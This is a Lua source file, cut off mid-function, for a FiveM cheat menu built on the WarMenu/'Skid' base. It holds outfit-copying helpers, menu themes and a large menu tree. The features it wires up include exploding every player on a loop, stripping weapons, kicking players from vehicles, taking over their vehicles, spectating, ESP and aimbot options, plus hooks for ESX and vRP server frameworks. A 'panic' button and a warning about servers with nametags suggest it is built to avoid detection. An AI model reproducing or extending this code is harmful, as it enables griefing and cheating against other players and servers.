9 - Accessories like bags, mask, scuba mask
10- Decals and mask
11 - Auxiliary parts for torso
]]
local function GetCurrentOutfit(target)
    local ped = GetPlayerPed(target)
    outfit = {}
    
    outfit.hat = GetPedPropIndex(ped, 0)
    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
    
    outfit.glasses = GetPedPropIndex(ped, 1)
    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    outfit.ear = GetPedPropIndex(ped, 2)
    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
    
    outfit.watch = GetPedPropIndex(ped, 6)
    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
    
    outfit.wrist = GetPedPropIndex(ped, 7)
    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
    outfit.head_palette = GetPedPaletteVariation(ped, 0)
    outfit.head_texture = GetPedTextureVariation(ped, 0)
    
    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
    outfit.beard_texture = GetPedTextureVariation(ped, 1)
    
    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
    outfit.hair_texture = GetPedTextureVariation(ped, 2)
    
    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
    outfit.torso_texture = GetPedTextureVariation(ped, 3)
    
    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
    outfit.legs_texture = GetPedTextureVariation(ped, 4)
    
    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
    outfit.hands_texture = GetPedTextureVariation(ped, 5)
    
    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
    outfit.foot_texture = GetPedTextureVariation(ped, 6)
    
    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
    
    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
    
    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
    
    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
    outfit.mask_texture = GetPedTextureVariation(ped, 10)
    
    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
    outfit.aux_texture = GetPedTextureVariation(ped, 11)
    
    return outfit
end

local function SetCurrentOutfit(outfit)
    local ped = PlayerPedId()
    
    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
    
    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end

local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

function IsResourceInstalled(name)
    local resources = GetResources()
    for i = 1, #resources do
        if resources[i] == name then
            return true
        else
            return false
        end
    end
end

-- SkidMenu Functions
function WarMenu.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function WarMenu.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function WarMenu.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function WarMenu.PopupWindow(x, y, title)
-- Not yet implemented
end

-- Get colors from https://www.hexcolortool.com/
function WarMenu.SetTheme(id, theme)
    if theme == "basic" then
        WarMenu.SetMenuBackgroundColor(id, 81, 231, 251, 125)
        WarMenu.SetTitleBackgroundColor(id, 92, 212, 249, 80)
        WarMenu.SetTitleColor(id, 92, 212, 249, 230)
        WarMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        WarMenu.SetMenuFocusColor(id, 40, 40, 40, 230)
        WarMenu.SetFont(id, 7)
        WarMenu.SetMenuX(id, .75)-- [0.0..1.0] top left corner
        WarMenu.SetMenuY(id, .1)-- [0.0..1.0] top
        WarMenu.SetMenuWidth(id, 0.23)-- 0.23
        WarMenu.SetMaxOptionCount(id, 12)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~b~'
        themearrow = "+"
    elseif theme == "dark" then
        WarMenu.SetMenuBackgroundColor(id, 180, 80, 80, 125)
        WarMenu.SetTitleBackgroundColor(id, 180, 80, 80, 90)
        WarMenu.SetTitleColor(id, 180, 80, 80, 230)
        WarMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        WarMenu.SetMenuFocusColor(id, 40, 40, 40, 230)
        WarMenu.SetFont(id, 1)
        WarMenu.SetMenuX(id, .75)
        WarMenu.SetMenuY(id, .1)
        WarMenu.SetMenuWidth(id, 0.23)-- 0.23
        WarMenu.SetMaxOptionCount(id, 12)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~r~'
        themearrow = ">"
    elseif theme == "skid" then
        WarMenu.SetMenuBackgroundColor(id, 5, 160, 1, 125)
        WarMenu.SetTitleBackgroundColor(id, 5, 233, 1, 255)
        WarMenu.SetTitleColor(id, 5, 233, 1, 200)
        WarMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        WarMenu.SetFont(id, 0)
        WarMenu.SetMenuX(id, .75)
        WarMenu.SetMenuY(id, .1)
        WarMenu.SetMenuWidth(id, 0.23)-- 0.23
        WarMenu.SetMaxOptionCount(id, 12)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~u~'
        themearrow = "~u~>"
    elseif theme == "infamous" then
        WarMenu.SetMenuBackgroundColor(id, 38, 38, 38, 80)
        WarMenu.SetTitleBackgroundColor(id, 92, 212, 249, 170)
        WarMenu.SetTitleColor(id, 240, 240, 240, 255)
        WarMenu.SetMenuSubTextColor(id, 240, 240, 240, 255)
        WarMenu.SetMenuFocusBackgroundColor(id, 100, 220, 250, 180)
        WarMenu.SetFont(id, 4)
        WarMenu.SetMenuX(id, .725)
        WarMenu.SetMenuY(id, .1)
        WarMenu.SetMenuWidth(id, 0.25)-- 0.23
        WarMenu.SetMaxOptionCount(id, 12)-- 10
        
        titleHeight = 0.07 --0.11
        titleXOffset = 0.2 -- 0.5
        titleYOffset = 0.005 --0.03
        titleScale = 0.7 -- 1.0
        titleSpacing = 1.5
        buttonHeight = 0.033 --0.038
        buttonScale = 0.360 --0.365
        buttonTextXOffset = 0.003 --0.005
        buttonTextYOffset = 0.0025 --0.005
        
        themecolor = "~s~"
        themearrow = ">>"
    end
end

function WarMenu.InitializeTheme()
    for i = 1, #menulist do
        WarMenu.SetTheme(menulist[i], theme)
    end
end

-- ComboBox w/ new index behaviour (does not wrap around)
function WarMenu.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if WarMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
    return false
end

-- Button with a slider
function WarMenu.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if WarMenu.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16 -- Default value in case of any error?
        local stabilizer = 1

        -- Draw order from top to bottom
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

        --Ugly Code, I'll refactor it later
        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
        end
        -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
		-- (sliderWidth * roundNum((itemsCount / 2), 3)
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
	end
end

-- Getting the center of an odd number of itemsCount (breaks on negative numbers)
function roundNum(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function WarMenu.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

-- Texture Handling
Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "skid" then -- static effect for skid theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
            if p == 5 then p = 1 else p = p + 1 end
            for i = 1, #menulist do
                if WarMenu.IsMenuOpened(menulist[i]) then WarMenu.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
            end
        else -- Base textures
            for i = 1, #menulist do WarMenu.SetTitleBackgroundSprite(menulist[i], 'commonmenu', 'gradient_bgd') end
        end
        Wait(100)
    end
end)

--[[
function FloatingSprite(dict, name, x, y, scalex, scaley, r, g, b, a)
Citizen.CreateThread(function()
local timer = 0
while true do
if WarMenu.IsAnyMenuOpened() then
if timer < 1000 then timer = timer+1 end

end
Wait(0)
end
end)
end

-- Sprites
local randx = math.random()%1
local randy = math.random()%1
FloatingSprite('commonmenu', 'mp_specitem_weed', randx, randy, 0.05, 0.05, 20, 200, 20, 200)
]]
-- Initializing
Resources = GetResources()

ResourcesToCheck = {
        -- ESX
        "es_extended", "esx_dmvschool", "esx_policejob", "",
        -- VRP
        "vrp", "vrp_trucker", "vrp_TruckerJob"
}

print("\n\nRESOURCES FOUND\n________________\n")
for i = 1, #Resources do
    print(Resources[i])
end
print("\n________________\nEND OF RESOURCES\n")

-- MAIN
Citizen.CreateThread(function()
    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
    ShowInfo(motd)

    -- COMBO BOXES
    
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 

    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    
    if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
        currHatIndex = 9
        selHatIndex = 9
    end

	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)

    -- Fixes the Hat starting at index 1 not displaying because its value is 0
    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
        currHatTextureIndex = 1
        selHatTextureIndex = 1
    end
    
	local currPFuncIndex = 1
	local selPFuncIndex = 1
	
	local currSPFuncIndex = 1
	local selSPFuncIndex = 1
	
	local currVFuncIndex = 1
	local selVFuncIndex = 1
	
	local currSeatIndex = 1
	local selSeatIndex = 1
	
	local currTireIndex = 1
	local selTireIndex = 1
	
    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1
    
    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1
    
    local currFastRunIndex = 1
    local selFastRunIndex = 1
    
    local currFastSwimIndex = 1
    local selFastSwimIndex = 1

    local currObjIndex = 1
    local selObjIndex = 1
    
    local currRotationIndex = 3
    local selRotationIndex = 3
    
    local currDirectionIndex = 1
    local selDirectionIndex = 1
    
    local Outfits = {}
    local currClothingIndex = 1
    local selClothingIndex = 1
    
    local currGravIndex = 3
    local selGravIndex = 3
    
    local currSpeedIndex = 1
    local selSpeedIndex = 1
    
    local currAttackTypeIndex = 1
    local selAttackTypeIndex = 1
    
    local currESPDistance = 3
    local selESPDistance = 3
	
	local currESPRefreshIndex = 1
	local selESPRefreshIndex = 1
    
    local currAimbotBoneIndex = 1
    local selAimbotBoneIndex = 1
    
    local currSaveLoadIndex1 = 1
    local selSaveLoadIndex1 = 1
    local currSaveLoadIndex2 = 1
    local selSaveLoadIndex2 = 1
    local currSaveLoadIndex3 = 1
    local selSaveLoadIndex3 = 1
    local currSaveLoadIndex4 = 1
    local selSaveLoadIndex4 = 1
    local currSaveLoadIndex5 = 1
    local selSaveLoadIndex5 = 1
    
    local currRadioIndex = 1
    local selRadioIndex = 1

    local currWeatherIndex = 1
    local selWeatherIndex = 1

    -- GLOBALS
    local TrackedPlayer = nil
	local SpectatedPlayer = nil
	local FlingedPlayer = nil
    local PossessingVeh = false
	local pvblip = nil
	local pvehicle = nil
    local pvehicleText = ""
	local IsPlayerHost = nil
	
	if NetworkIsHost() then
		IsPlayerHost = "~g~Yes"
	else
		IsPlayerHost = "~r~No"
	end
	
    local savedpos1 = nil
    local savedpos2 = nil
    local savedpos3 = nil
    local savedpos4 = nil
    local savedpos5 = nil
    
    -- TOGGLES
    local includeself = true
    local Collision = true
    local objVisible = true
    local PlaceSelf = true
    local SpawnInAir = true
    local SpawnEngineOn = true
    
    -- TABLES
    SpawnedObjects = {}
    
    -- MAIN MENU
    WarMenu.CreateMenu('skid', menuName .. ' v' .. version)
    WarMenu.SetSubTitle('skid', 'Based on Skid and enhanced by A&T SERVICES ')
    
    -- MAIN MENU SUBMENUS
    WarMenu.CreateSubMenu('player', 'skid', 'Player Options')
    WarMenu.CreateSubMenu('self', 'skid', 'Self Options')
    WarMenu.CreateSubMenu('weapon', 'skid', 'Weapon Options')
    WarMenu.CreateSubMenu('vehicle', 'skid', 'Vehicle Options')
    WarMenu.CreateSubMenu('world', 'skid', 'World Options')
	WarMenu.CreateSubMenu('teleport', 'skid', 'Teleport Options')
    WarMenu.CreateSubMenu('misc', 'skid', 'Misc Options')
    WarMenu.CreateSubMenu('lua', 'skid', 'Lua Options')
    
    -- PLAYER MENU SUBMENUS
    WarMenu.CreateSubMenu('allplayer', 'player', 'All Players')
    WarMenu.CreateSubMenu('playeroptions', 'player', 'Player Options')
    
    -- SELF MENU SUBMENUS
    WarMenu.CreateSubMenu('appearance', 'self', 'Appearance Options')
    WarMenu.CreateSubMenu('modifiers', 'self', 'Modifiers Options')
	WarMenu.CreateSubMenu('esxoutfits', 'self', 'ESX Outfits')
	-- APPEARANCE SUBMENUS
	WarMenu.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
    WarMenu.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
    
    -- WEAPON MENU SUBMENUS
    WarMenu.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
    WarMenu.CreateSubMenu('esxoutfits', 'self', 'ESX Outfits')
    WarMenu.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
    WarMenu.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
    WarMenu.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
    WarMenu.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
    WarMenu.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
    WarMenu.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
    WarMenu.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
    WarMenu.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')
    
    -- VEHICLE MENU SUBMENUS
    WarMenu.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
    WarMenu.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    WarMenu.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')
    WarMenu.CreateSubMenu('vehiclemodifiers', 'vehicle', 'Vehicle Modifiers')
    -- VEHICLE SPAWNER MENU
    WarMenu.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
    WarMenu.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
    WarMenu.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
    WarMenu.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
    WarMenu.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
    WarMenu.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
    WarMenu.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
    WarMenu.CreateSubMenu('super', 'vehiclespawner', 'Super')
    WarMenu.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
    WarMenu.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
    WarMenu.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
    WarMenu.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
    WarMenu.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
    WarMenu.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
    WarMenu.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
    WarMenu.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
    WarMenu.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
    WarMenu.CreateSubMenu('service', 'vehiclespawner', 'Service')
    WarMenu.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')
    
    -- VEHICLE MODS SUBMENUS
    WarMenu.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
    WarMenu.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
    WarMenu.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')
    
    WarMenu.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
    WarMenu.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
    WarMenu.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')
    
    WarMenu.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
    WarMenu.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
    WarMenu.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')
    
    WarMenu.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')
    
    -- WORLD MENU SUBMENUS
    WarMenu.CreateSubMenu('objectspawner', 'world', 'Object Spawner')
    WarMenu.CreateSubMenu('objectlist', 'objectspawner', 'Select To Delete')
    WarMenu.CreateSubMenu('weather', 'world', 'Weather Changer ~r~(CLIENT SIDE)')
    WarMenu.CreateSubMenu('time', 'world', 'Time Changer')
    
    -- MISC MENU SUBMENUS
	WarMenu.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
	WarMenu.CreateSubMenu('keybindings', 'misc', 'Keybindings')
    WarMenu.CreateSubMenu('visualoptions', 'misc', 'Visual Options')
	WarMenu.CreateSubMenu('webradio', 'misc', 'Web Radio')
    WarMenu.CreateSubMenu('credits', 'misc', 'Credits')
    WarMenu.CreateSubMenu('menuPosition', 'misc', 'MENU POSITION')
WarMenu.CreateSubMenu('adultemotes', 'misc', '18+ EMOTES')

    -- TELEPORT MENU SUBMENUS
    WarMenu.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
    WarMenu.CreateSubMenu('pois', 'teleport', 'POIs')
    
    -- LUA MENU SUBMENUS
    WarMenu.CreateSubMenu('esx', 'lua', 'ESX Options')
    WarMenu.CreateSubMenu('vrp', 'lua', 'vRP Options')
    WarMenu.CreateSubMenu('other', 'lua', 'Other')
    
    WarMenu.InitializeTheme()
    
    while true do
        
        -- MAIN MENU
        if WarMenu.IsMenuOpened('skid') then
            if WarMenu.MenuButton('Player Options', 'player') then
            elseif WarMenu.MenuButton('Self Options', 'self') then
            elseif WarMenu.MenuButton('Weapon Options', 'weapon') then
            elseif WarMenu.MenuButton('Vehicle Options', 'vehicle') then
            elseif WarMenu.MenuButton('World Options', 'world') then
			elseif WarMenu.MenuButton('Teleport Options', 'teleport') then
						            elseif WarMenu.MenuButton('Misc Options', 'misc') then
            elseif WarMenu.MenuButton('Lua Options', 'lua') then
                        elseif WarMenu.Button('Exit') then WarMenu.CloseMenu()
            elseif WarMenu.Button('~r~Panic (Kill Menu)') then break
            end
        
        
        -- PLAYER OPTIONS MENU
        elseif WarMenu.IsMenuOpened('player') then
            if WarMenu.MenuButton('All Players', 'allplayer') then
                else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if WarMenu.MenuButton("ID: ~y~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), 'playeroptions') then
                        selectedPlayer = currPlayer end
                end
            end
        
        
        -- ALL PLAYERS MENU
        elseif WarMenu.IsMenuOpened('allplayer') then
            if WarMenu.CheckBox("Include Self", includeself, "No", "Yes") then
                includeself = not includeself
            elseif WarMenu.Button("Explode All Players") then
                ExplodeAll(includeself)
            elseif WarMenu.CheckBox("Explode All Players ~r~(LOOP)", ExplodingAll) then
                ExplodingAll = not ExplodingAll
            elseif WarMenu.Button("Give All Players Weapons") then
                GiveAllPlayersWeapons(includeself)
            elseif WarMenu.Button("Strip All Players Weapons") then
                StripAll(includeself)
            elseif WarMenu.Button("Kick All Players From Vehicle") then
                KickAllFromVeh(includeself)
            end
        
        
        -- SPECIFIC PLAYER OPTIONS
        elseif WarMenu.IsMenuOpened('playeroptions') then
            if WarMenu.Button("~p~Selected: " .. "~y~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
			elseif WarMenu.CheckBox("Spectate Player", Spectating, "Spectating: Nobody", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
				Spectating = not Spectating
				SpectatePlayer(selectedPlayer)
				SpectatedPlayer = selectedPlayer
            elseif WarMenu.Button("Possess Player Vehicle ~r~(Do not use on servers w/ nametags or blips)") then
                if Spectating then SpectatePlayer(selectedPlayer) end
                PossessVehicle(selectedPlayer)
            elseif WarMenu.Button("Teleport To Player") then
				local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
				if string.lower(confirm) == "y" then
					TeleportToPlayer(selectedPlayer)
				else
					ShowInfo("~r~Operation Canceled")
				end
                elseif WarMenu.CheckBox("Dance with Ped", DanceWithPedEnabled, "Off", "On") then
        DanceWithPedEnabled = not DanceWithPedEnabled
        if DanceWithPedEnabled then
            if selectedPlayer ~= -1 then -- בדיקה אם שחקן נבחר
                local targetPed = GetPlayerPed(selectedPlayer)
                if targetPed and DoesEntityExist(targetPed) then
                    local model = "a_f_y_hippie_01"
                    local x, y, z = table.unpack(GetEntityCoords(targetPed))

                    RequestModel(GetHashKey(model))
                    while not HasModelLoaded(GetHashKey(model)) do
                        Wait(0)
                    end
                    

                    dance_ped_global = CreatePed(4, GetHashKey(model), x + 0.5, y, z, 0.0, true, false)
                    if dance_ped_global then
